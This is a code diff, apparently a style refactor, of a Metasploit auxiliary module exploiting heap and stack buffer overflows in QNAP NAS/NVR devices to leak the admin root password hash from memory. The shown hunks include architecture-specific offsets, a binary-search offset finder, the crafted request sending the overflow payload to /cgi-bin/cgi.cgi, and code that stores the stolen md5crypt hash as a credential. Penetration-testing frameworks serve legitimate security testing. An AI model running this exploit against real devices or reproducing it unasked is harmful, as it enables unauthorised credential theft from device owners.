@@ -7,51 +7,59 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'QNAP NAS/NVR Administrator Hash Disclosure',
-      'Description'    => %q{
-        This module exploits combined heap and stack buffer overflows for QNAP
-        NAS and NVR devices to dump the admin (root) shadow hash from memory via
-        an overwrite of __libc_argv[0] in the HTTP-header-bound glibc backtrace.
+    super(
+      update_info(
+        info,
+        'Name' => 'QNAP NAS/NVR Administrator Hash Disclosure',
+        'Description' => %q{
+          This module exploits combined heap and stack buffer overflows for QNAP
+          NAS and NVR devices to dump the admin (root) shadow hash from memory via
+          an overwrite of __libc_argv[0] in the HTTP-header-bound glibc backtrace.
 
-        A binary search is performed to find the correct offset for the BOFs.
-        Since the server forks, blind remote exploitation is possible, provided
-        the heap does not have ASLR.
-      },
-      'Author'         => [
-        'bashis',      # Vuln/PoC
-        'wvu',         # Module
-        'Donald Knuth' # Algorithm
-      ],
-      'References'     => [
-        ['URL', 'https://seclists.org/fulldisclosure/2017/Feb/2'],
-        ['URL', 'https://en.wikipedia.org/wiki/Binary_search_algorithm']
-      ],
-      'DisclosureDate' => '2017-01-31',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [
-        ['Automatic', 'Description' => 'Automatic targeting'],
-        ['x86',       'Description' => 'x86 target', offset: 0x16b2],
-        ['ARM',       'Description' => 'ARM target', offset: 0x1562]
-      ],
-      'DefaultAction'  => 'Automatic',
-      'DefaultOptions' => {
-        'SSL'          => true
-      }
-    ))
+          A binary search is performed to find the correct offset for the BOFs.
+          Since the server forks, blind remote exploitation is possible, provided
+          the heap does not have ASLR.
+        },
+        'Author' => [
+          'bashis',      # Vuln/PoC
+          'wvu',         # Module
+          'Donald Knuth' # Algorithm
+        ],
+        'References' => [
+          ['URL', 'https://seclists.org/fulldisclosure/2017/Feb/2'],
+          ['URL', 'https://en.wikipedia.org/wiki/Binary_search_algorithm']
+        ],
+        'DisclosureDate' => '2017-01-31',
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          ['Automatic', 'Description' => 'Automatic targeting'],
+          ['x86', 'Description' => 'x86 target', offset: 0x16b2],
+          ['ARM', 'Description' => 'ARM target', offset: 0x1562]
+        ],
+        'DefaultAction' => 'Automatic',
+        'DefaultOptions' => {
+          'SSL' => true
+        },
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options([
       Opt::RPORT(443),
       OptInt.new('OFFSET_START', [true, 'Starting offset (backtrace)', 2000]),
-      OptInt.new('OFFSET_END',   [true, 'Ending offset (no backtrace)', 5000]),
-      OptInt.new('RETRIES',      [true, 'Retry count for the attack', 10])
+      OptInt.new('OFFSET_END', [true, 'Ending offset (no backtrace)', 5000]),
+      OptInt.new('RETRIES', [true, 'Retry count for the attack', 10])
     ])
   end
 
   def check
     res = send_request_cgi(
       'method' => 'GET',
-      'uri'    => '/cgi-bin/authLogin.cgi'
+      'uri' => '/cgi-bin/authLogin.cgi'
     )
 
     if res && res.code == 200 && (xml = res.get_xml_document)
@@ -90,12 +98,12 @@ class MetasploitModule < Msf::Auxiliary
     if admin_hash
       print_good("Hopefully this is your hash: #{admin_hash}")
       credential_data = {
-        workspace_id:    myworkspace_id,
+        workspace_id: myworkspace_id,
         module_fullname: self.fullname,
-        username:        'admin',
-        private_data:    admin_hash,
-        private_type:    :nonreplayable_hash,
-        jtr_format:      'md5crypt'
+        username: 'admin',
+        private_data: admin_hash,
+        private_type: :nonreplayable_hash,
+        jtr_format: 'md5crypt'
       }.merge(service_details)
       create_credential(credential_data)
     else
@@ -110,8 +118,8 @@ class MetasploitModule < Msf::Auxiliary
     r = datastore['OFFSET_END']
 
     start = Time.now
-    t     = binsearch(l, r)
-    stop  = Time.now
+    t = binsearch(l, r)
+    stop = Time.now
 
     time = stop - start
     vprint_status("Binary search of #{l}-#{r} completed in #{time}s")
@@ -146,7 +154,7 @@ class MetasploitModule < Msf::Auxiliary
 
       if token && token.start_with?('$1$')
         admin_hash = token
-        addr       = "0x#{offset.to_s(16)}"
+        addr = "0x#{offset.to_s(16)}"
         vprint_status("Admin hash found at #{addr} with offset #{t}")
         break
       end
@@ -185,12 +193,12 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     res = send_request_cgi(
-      'method'   => 'GET',
-      'uri'      => '/cgi-bin/cgi.cgi',
-      #'vhost'    => 'Q',
+      'method' => 'GET',
+      'uri' => '/cgi-bin/cgi.cgi',
+      # 'vhost'    => 'Q',
       'vars_get' => {
-        'u'      => 'admin',
-        'p'      => payload
+        'u' => 'admin',
+        'p' => payload
       }
     )
 
